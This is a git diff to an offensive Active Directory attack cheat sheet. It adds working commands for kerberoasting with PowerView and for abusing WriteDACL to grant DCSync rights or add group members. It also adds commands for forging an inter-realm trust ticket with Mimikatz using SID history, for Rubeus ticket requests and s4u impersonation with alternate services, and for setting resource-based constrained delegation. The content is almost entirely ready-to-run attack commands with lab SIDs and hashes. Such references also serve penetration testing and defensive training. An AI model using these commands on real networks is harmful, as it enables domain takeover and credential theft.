@@ -1098,6 +1098,12 @@ Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
 ```
 
+Alternatively with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+
+```powershell
+Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+```
+
 Alternatively on macOS machine you can use [bifrost](https://github.com/its-a-feature/bifrost)
 
 ```powershell
@@ -1489,13 +1495,20 @@ NOTE: To not alert the user the payload should hide its own process window and s
 
 To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
 
-```powershell
-# Give DCSync right to the principal identity
-Import-Module .\PowerView.ps1
-$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
-```
+* WriteDACL on Domain
+  ```powershell
+  # Give DCSync right to the principal identity
+  Import-Module .\PowerView.ps1
+  $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
+  $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
+  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
+  ```
+  
+* WriteDACL on Group
+  ```powershell
+  Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
+  net group "INTERESTING_GROUP" User1 /add /domain
+  ```
 
 #### WriteOwner
 
@@ -1605,6 +1618,9 @@ Prerequisite:
 
 ### Forest to Forest Compromise - Trust Ticket
 
+From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using 
+Mimikatz, adding the SID for the target domain's enterprise admins group to our **SID history**.
+
 #### Dumping trust passwords (trust keys)
 
 > Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing “$” are computer accounts, but some are trust accounts.
@@ -1619,12 +1635,14 @@ or find the TRUST_NAME$ machine account hash
 
 ```powershell
 mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
+mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
 ```
 
 #### Use the Trust Ticket file to get a TGS for the targeted service
 
 ```powershell
-./asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
+.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
+.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
 ```
 
 Inject the TGS file and access the targeted service with the spoofed rights.
@@ -1727,8 +1745,9 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [*] Saving ticket in Administrator.ccache
 
 # Exploit with Rubeus
+$ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
 $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
-$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /ptt
+$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
 $ dir \\dc.domain.com\c$
 ```
 
@@ -1766,7 +1785,6 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 
     ```powershell
     $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
-
     $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
     $SDBytes = New-Object byte[] ($SD.BinaryLength)
     $SD.GetBinaryForm($SDBytes, 0)
@@ -1774,6 +1792,15 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
     $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
     $Descriptor.DiscretionaryAcl
+    ```
+
+    ```ps1
+    # alternative
+    $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer M3DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+    # alternative
+    StandIn_Net35.exe --computer m3dc --sid SID_FROM_PREVIOUS_COMMAND
     ```
 
 5. Use Rubeus to get hash from password
@@ -1793,7 +1820,7 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 6. Impersonate domain admin using our newly created machine account
 
     ```powershell
-    .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt
+    .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
 
     [*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
     [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
